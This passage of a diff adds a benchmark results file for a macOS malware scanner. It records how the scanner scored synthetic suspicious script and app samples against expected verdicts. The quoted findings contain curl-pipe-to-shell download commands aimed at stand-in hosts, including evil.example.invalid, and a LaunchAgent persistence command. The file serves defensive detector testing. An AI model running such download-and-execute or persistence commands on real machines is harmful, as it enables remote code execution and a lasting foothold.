+        "generic_partial: 无法完整读取签名信息：\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/SyntheticSuspiciousFixture_02.app: code object is not signed at all",
+        "generic_partial: 未提取到 Entitlements（可能该应用未声明或无法读取）"
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/hybrid\/SyntheticSuspiciousFixture_02.app",
+      "sampleID" : "suspicious_hybrid_app_bundle_fixture_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:36Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 181,
+      "analysisSummary" : "未发现明显高风险行为，当前评分 0\/100，判定 Clean（低风险）。",
+      "detectedType" : "appleScript",
+      "expectedScoreRange" : {
+        "max" : 88,
+        "min" : 65
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "检测到脚本高风险行为特征",
+        "[applescript.do_shell_script] AppleScript 调用 shell [high] L18-18 Δ20: \"payload\": \"do shell script 'osascript -e ...'\"",
+        "Script analyzer detected 1 high-severity findings.",
+        "generic_partial: Script analyzer detected 1 high-severity findings."
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/hybrid\/suspicious_hybrid_chain_sim_01.json",
+      "sampleID" : "suspicious_hybrid_chain_sim_01",
+      "score" : 0,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:36Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 781,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "machO",
+      "expectedScoreRange" : {
+        "max" : 80,
+        "min" : 70
+      },
+      "expectedVerdict" : "malicious",
+      "findings" : [
+        "Executable file",
+        "No dedicated analyzer for machO. Fallback to generic analyzer.",
+        "generic_partial: No dedicated analyzer for machO. Fallback to generic analyzer."
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/hybrid\/suspicious_hybrid_dmg_mirror_fixture_02",
+      "sampleID" : "suspicious_hybrid_dmg_mirror_fixture_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:37Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 764,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "machO",
+      "expectedScoreRange" : {
+        "max" : 80,
+        "min" : 68
+      },
+      "expectedVerdict" : "malicious",
+      "findings" : [
+        "Executable file",
+        "No dedicated analyzer for machO. Fallback to generic analyzer.",
+        "generic_partial: No dedicated analyzer for machO. Fallback to generic analyzer."
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/hybrid\/suspicious_hybrid_pkg_fixture_02",
+      "sampleID" : "suspicious_hybrid_pkg_fixture_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:38Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 178,
+      "analysisSummary" : "该样本检测到编码\/混淆后执行行为，存在规避审计迹象。；未获取到可执行样本签名信息。。综合评分 25\/100，判定 Clean（低风险）。",
+      "detectedType" : "javaScript",
+      "expectedScoreRange" : {
+        "max" : 74,
+        "min" : 55
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "检测到混淆或编码逃逸",
+        "[javascript.base64_obfuscation] Buffer\/base64 混淆痕迹 [medium] L3-3 Δ14: const encoded = Buffer.from(payload, 'utf8').toString('base64');",
+        "[javascript.base64_obfuscation] Buffer\/base64 混淆痕迹 [medium] L4-4 Δ14: const decoded = Buffer.from(encoded, 'base64').toString('utf8');"
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/js\/suspicious_js_buffer_obfuscation_sim_02.js",
+      "sampleID" : "suspicious_js_buffer_obfuscation_sim_02",
+      "score" : 25,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:38Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 181,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "javaScript",
+      "expectedScoreRange" : {
+        "max" : 72,
+        "min" : 55
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "检测到脚本高风险行为特征",
+        "[javascript.child_process] Node child_process 执行链 [high] L2-2 Δ22: const { execFile } = require('child_process');",
+        "Script analyzer detected 1 high-severity findings.",
+        "generic_partial: Script analyzer detected 1 high-severity findings."
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/js\/suspicious_js_child_process_echo_chain_02.js",
+      "sampleID" : "suspicious_js_child_process_echo_chain_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:38Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 176,
+      "analysisSummary" : "该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；未获取到可执行样本签名信息。。综合评分 45\/100，判定 Suspicious（可疑）。",
+      "detectedType" : "javaScript",
+      "expectedScoreRange" : {
+        "max" : 78,
+        "min" : 60
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "检测到远程下载执行链",
+        "检测到混淆或编码逃逸",
+        "[javascript.network_download_exec] 网络下载并执行链 [critical] L11-11 Δ34: https.get('https:\/\/example.com\/', (res) => {",
+        "Script analyzer detected 1 high-severity findings.",
+        "generic_partial: Script analyzer detected 1 high-severity findings."
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "suspicious\/js\/suspicious_js_download_execute_sim_02.js",
+      "sampleID" : "suspicious_js_download_execute_sim_02",
+      "score" : 45,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:38Z",
+      "verdict" : "suspicious"
+    },
+    {
+      "analysisDurationMs" : 176,
+      "analysisSummary" : "该样本检测到编码\/混淆后执行行为，存在规避审计迹象。；未获取到可执行样本签名信息。。综合评分 25\/100，判定 Clean（低风险）。",
+      "detectedType" : "javaScript",
+      "expectedScoreRange" : {
+        "max" : 76,
+        "min" : 58
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "检测到混淆或编码逃逸",
+        "[javascript.eval] JavaScript 动态执行(eval) [high] L4-4 Δ22: const value = eval(decoded);",
+        "[javascript.base64_obfuscation] Buffer\/base64 混淆痕迹 [medium] L2-2 Δ14: const encoded = Buffer.from(\"'synthetic harmless eval message'\", 'utf8').toString('base64');",
+        "[javascript.base64_obfuscation] Buffer\/base64 混淆痕迹 [medium] L3-3 Δ14: const decoded = Buffer.from(encoded, 'base64').toString('utf8');",
+        "Script analyzer detected 1 high-severity findings.",
+        "generic_partial: Script analyzer detected 1 high-severity findings."
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/js\/suspicious_js_eval_decode_message_02.js",
+      "sampleID" : "suspicious_js_eval_decode_message_02",
+      "score" : 25,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:38Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 175,
+      "analysisSummary" : "该样本检测到编码\/混淆后执行行为，存在规避审计迹象。；未获取到可执行样本签名信息。。综合评分 25\/100，判定 Clean（低风险）。",
+      "detectedType" : "javaScript",
+      "expectedScoreRange" : {
+        "max" : 80,
+        "min" : 60
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "检测到混淆或编码逃逸",
+        "[javascript.osascript_shell_chain] JavaScript 调用 osascript\/shell [high] L2-2 Δ24: const encoded = Buffer.from(\"osascript -e 'do shell script \\\"curl https:\/\/evil.example.invalid\\\"'\", \"utf8\").toString(\"base64\");",
+        "[javascript.base64_obfuscation] Buffer\/base64 混淆痕迹 [medium] L2-2 Δ14: const encoded = Buffer.from(\"osascript -e 'do shell script \\\"curl https:\/\/evil.example.invalid\\\"'\", \"utf8\").toString(\"base64\");",
+        "[javascript.base64_obfuscation] Buffer\/base64 混淆痕迹 [medium] L3-3 Δ14: const decoded = Buffer.from(encoded, \"base64\").toString(\"utf8\");",
+        "Script analyzer detected 1 high-severity findings.",
+        "generic_partial: Script analyzer detected 1 high-severity findings."
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/js\/suspicious_js_obfuscation_sim_01.js",
+      "sampleID" : "suspicious_js_obfuscation_sim_01",
+      "score" : 25,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:38Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 176,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 72,
+        "min" : 55
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/python\/suspicious_python_download_would_execute_02.py",
+      "sampleID" : "suspicious_python_download_would_execute_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:39Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 176,
+      "analysisSummary" : "该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到编码\/混淆后执行行为，存在规避审计迹象。；未获取到可执行样本签名信息。。综合评分 60\/100，判定 Malicious（高风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 82,
+        "min" : 62
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "检测到混淆或编码逃逸",
+        "[python.obfuscation] 编码\/压缩混淆痕迹 [medium] L2-2 Δ14: import base64",
+        "[python.obfuscation] 编码\/压缩混淆痕迹 [medium] L9-9 Δ14: encoded = base64.b64encode(b\"curl -L https:\/\/evil.example.invalid\/payload.sh | sh\").decode(\"ascii\")",
+        "[python.obfuscation] 编码\/压缩混淆痕迹 [medium] L10-10 Δ14: decoded = base64.b64decode(encoded).decode(\"utf-8\")"
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_high",
+      "path" : "suspicious\/python\/suspicious_python_downloader_sim_01.py",
+      "sampleID" : "suspicious_python_downloader_sim_01",
+      "score" : 60,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:39Z",
+      "verdict" : "malicious"
+    },
+    {
+      "analysisDurationMs" : 176,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 68,
+        "min" : 52
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "检测到混淆或编码逃逸",
+        "[python.os_system] os.system 命令执行 [high] L6-6 Δ20: os.system(f'echo \"[dry-run][os.system] would run: {chain}\"')",
+        "[python.subprocess_exec] subprocess 外部进程执行 [high] L7-7 Δ20: subprocess.run([\"echo\", \"[dry-run][subprocess] would invoke staged shell chain\"], check=True)",
+        "Script analyzer detected 2 high-severity findings.",
+        "generic_partial: Script analyzer detected 2 high-severity findings."
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/python\/suspicious_python_echo_chain_02.py",
+      "sampleID" : "suspicious_python_echo_chain_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:39Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 178,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 68,
+        "min" : 52
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/python\/suspicious_python_launchagent_mirror_02.py",
+      "sampleID" : "suspicious_python_launchagent_mirror_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:39Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 177,
+      "analysisSummary" : "该样本检测到编码\/混淆后执行行为，存在规避审计迹象。；未获取到可执行样本签名信息。。综合评分 25\/100，判定 Clean（低风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 76,
+        "min" : 58
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "检测到混淆或编码逃逸",
+        "[python.obfuscation] 编码\/压缩混淆痕迹 [medium] L2-2 Δ14: import base64",
+        "[python.obfuscation] 编码\/压缩混淆痕迹 [medium] L3-3 Δ14: import marshal",
+        "[python.obfuscation] 编码\/压缩混淆痕迹 [medium] L4-4 Δ14: import zlib",
+        "[python.obfuscation] 编码\/压缩混淆痕迹 [medium] L7-7 Δ14: packed = marshal.dumps({\"msg\": harmless})",
+        "[python.obfuscation] 编码\/压缩混淆痕迹 [medium] L8-8 Δ14: compressed = zlib.compress(packed)",
+        "[python.obfuscation] 编码\/压缩混淆痕迹 [medium] L9-9 Δ14: encoded = base64.b64encode(compressed)",
+        "[python.obfuscation] 编码\/压缩混淆痕迹 [medium] L11-11 Δ14: restored = marshal.loads(zlib.decompress(base64.b64decode(encoded)))"
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/python\/suspicious_python_obfuscation_restore_02.py",
+      "sampleID" : "suspicious_python_obfuscation_restore_02",
+      "score" : 25,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:39Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 175,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 78,
+        "min" : 60
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/python\/suspicious_python_reverse_shell_string_02.py",
+      "sampleID" : "suspicious_python_reverse_shell_string_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:40Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 176,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "pythonScript",
+      "expectedScoreRange" : {
+        "max" : 58,
+        "min" : 40
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/python\/suspicious_python_socket_metadata_sim_02.py",
+      "sampleID" : "suspicious_python_socket_metadata_sim_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:40Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 178,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 72,
+        "min" : 55
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/shell\/suspicious_shell_base64_decode_print_02.sh",
+      "sampleID" : "suspicious_shell_base64_decode_print_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:40Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 176,
+      "analysisSummary" : "该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；未获取到可执行样本签名信息。。综合评分 45\/100，判定 Suspicious（可疑）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 75,
+        "min" : 60
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "检测到远程下载执行链",
+        "[shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L5-5 Δ35: CHAIN_CMD='curl -fsSL https:\/\/example.com\/install.sh | sh'",
+        "Script analyzer detected 1 high-severity findings.",
+        "generic_partial: Script analyzer detected 1 high-severity findings."
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : true,
+      "mismatchReason" : "score_too_low",
+      "path" : "suspicious\/shell\/suspicious_shell_download_exec_string_02.sh",
+      "sampleID" : "suspicious_shell_download_exec_string_02",
+      "score" : 45,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:40Z",
+      "verdict" : "suspicious"
+    },
+    {
+      "analysisDurationMs" : 179,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 72,
+        "min" : 58
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "检测到持久化行为",
+        "[shell.launchctl.persistence] launchctl 持久化操作 [high] L22-22 Δ20: echo \"[dry-run] launchctl load NOT invoked\"",
+        "Script persistence behavior detected.",
+        "Script analyzer detected 1 high-severity findings.",
+        "generic_partial: Script analyzer detected 1 high-severity findings."
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/shell\/suspicious_shell_launchagent_mirror_02.sh",
+      "sampleID" : "suspicious_shell_launchagent_mirror_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:40Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 176,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 78,
+        "min" : 60
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/shell\/suspicious_shell_mktemp_chain_sim_02.sh",
+      "sampleID" : "suspicious_shell_mktemp_chain_sim_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:40Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 176,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 80,
+        "min" : 62
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/shell\/suspicious_shell_multistage_chain_note_02.sh",
+      "sampleID" : "suspicious_shell_multistage_chain_note_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:41Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 176,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 80,
+        "min" : 60
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "检测到持久化行为",
+        "[shell.write_launchagent] 写入 LaunchAgents\/LaunchDaemons [critical] L8-8 Δ32: PERSIST_CMD='launchctl bootstrap gui\/$(id -u) ~\/Library\/LaunchAgents\/com.fake.agent.plist'",
+        "[shell.launchctl.persistence] launchctl 持久化操作 [high] L8-8 Δ20: PERSIST_CMD='launchctl bootstrap gui\/$(id -u) ~\/Library\/LaunchAgents\/com.fake.agent.plist'",
+        "Script persistence behavior detected.",
+        "Script analyzer detected 2 high-severity findings.",
+        "generic_partial: Script analyzer detected 2 high-severity findings."
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/shell\/suspicious_shell_persistence_sim_01.sh",
+      "sampleID" : "suspicious_shell_persistence_sim_01",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:41Z",
+      "verdict" : "clean"
+    },
+    {
+      "analysisDurationMs" : 178,
+      "analysisSummary" : "该样本未获取到可执行样本签名信息。。综合评分 10\/100，判定 Clean（低风险）。",
+      "detectedType" : "shellScript",
+      "expectedScoreRange" : {
+        "max" : 68,
+        "min" : 50
+      },
+      "expectedVerdict" : "suspicious",
+      "findings" : [
+        "未发现高风险规则命中",
+        "No high-risk script rule hit"
+      ],
+      "group" : "suspicious",
+      "matchedScoreRange" : false,
+      "matchedVerdict" : false,
+      "mismatchReason" : "verdict_too_low",
+      "path" : "suspicious\/shell\/suspicious_shell_profile_mirror_02.sh",
+      "sampleID" : "suspicious_shell_profile_mirror_02",
+      "score" : 10,
+      "status" : "completed",
+      "timestamp" : "2026-03-08T10:11:41Z",
+      "verdict" : "clean"
+    }
+  ],
+  "runID" : "2026-03-08T10-11-22Z-441932",
+  "samples" : [
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/app\/clean_app_manifest_01.json",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 10,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/app\/clean_app_manifest_01.json.meta.json",
+      "relativePath" : "clean\/app\/clean_app_manifest_01.json",
+      "sampleID" : "clean_app_manifest_01",
+      "sourceKind" : "file",
+      "subtype" : "app"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/applescript\/clean_applescript_notification_01.applescript",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 12,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/applescript\/clean_applescript_notification_01.applescript.meta.json",
+      "relativePath" : "clean\/applescript\/clean_applescript_notification_01.applescript",
+      "sampleID" : "clean_applescript_notification_01",
+      "sourceKind" : "file",
+      "subtype" : "applescript"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/applescript\/clean_applescript_open_finder_01.applescript",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 8,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/applescript\/clean_applescript_open_finder_01.applescript.json",
+      "relativePath" : "clean\/applescript\/clean_applescript_open_finder_01.applescript",
+      "sampleID" : "clean_applescript_open_finder_01",
+      "sourceKind" : "file",
+      "subtype" : "applescript"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/applescript\/clean_applescript_prompt_01.applescript",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 6,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/applescript\/clean_applescript_prompt_01.applescript.json",
+      "relativePath" : "clean\/applescript\/clean_applescript_prompt_01.applescript",
+      "sampleID" : "clean_applescript_prompt_01",
+      "sourceKind" : "file",
+      "subtype" : "applescript"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/applescript\/clean_applescript_textedit_newdoc_01.applescript",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 8,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/applescript\/clean_applescript_textedit_newdoc_01.applescript.json",
+      "relativePath" : "clean\/applescript\/clean_applescript_textedit_newdoc_01.applescript",
+      "sampleID" : "clean_applescript_textedit_newdoc_01",
+      "sourceKind" : "file",
+      "subtype" : "applescript"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/js\/clean_js_base64_demo_01.js",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 15,
+          "min" : 3
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/js\/clean_js_base64_demo_01.js.json",
+      "relativePath" : "clean\/js\/clean_js_base64_demo_01.js",
+      "sampleID" : "clean_js_base64_demo_01",
+      "sourceKind" : "file",
+      "subtype" : "js"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/js\/clean_js_child_process_echo_01.js",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 18,
+          "min" : 5
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/js\/clean_js_child_process_echo_01.js.json",
+      "relativePath" : "clean\/js\/clean_js_child_process_echo_01.js",
+      "sampleID" : "clean_js_child_process_echo_01",
+      "sourceKind" : "file",
+      "subtype" : "js"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/js\/clean_js_config_merge_01.js",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 12,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/js\/clean_js_config_merge_01.js.meta.json",
+      "relativePath" : "clean\/js\/clean_js_config_merge_01.js",
+      "sampleID" : "clean_js_config_merge_01",
+      "sourceKind" : "file",
+      "subtype" : "js"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/js\/clean_js_read_local_config_02.js",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 8,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/js\/clean_js_read_local_config_02.js.json",
+      "relativePath" : "clean\/js\/clean_js_read_local_config_02.js",
+      "sampleID" : "clean_js_read_local_config_02",
+      "sourceKind" : "file",
+      "subtype" : "js"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/pkg\/clean_pkg_receipt_stub_01.json",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 10,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/pkg\/clean_pkg_receipt_stub_01.json.meta.json",
+      "relativePath" : "clean\/pkg\/clean_pkg_receipt_stub_01.json",
+      "sampleID" : "clean_pkg_receipt_stub_01",
+      "sourceKind" : "file",
+      "subtype" : "pkg"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/plist\/clean_plist_launchagent_template_01.plist",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 18,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/plist\/clean_plist_launchagent_template_01.plist.meta.json",
+      "relativePath" : "clean\/plist\/clean_plist_launchagent_template_01.plist",
+      "sampleID" : "clean_plist_launchagent_template_01",
+      "sourceKind" : "file",
+      "subtype" : "plist"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/python\/clean_python_config_rw_02.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 12,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/python\/clean_python_config_rw_02.py.json",
+      "relativePath" : "clean\/python\/clean_python_config_rw_02.py",
+      "sampleID" : "clean_python_config_rw_02",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/python\/clean_python_directory_scan_01.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 10,
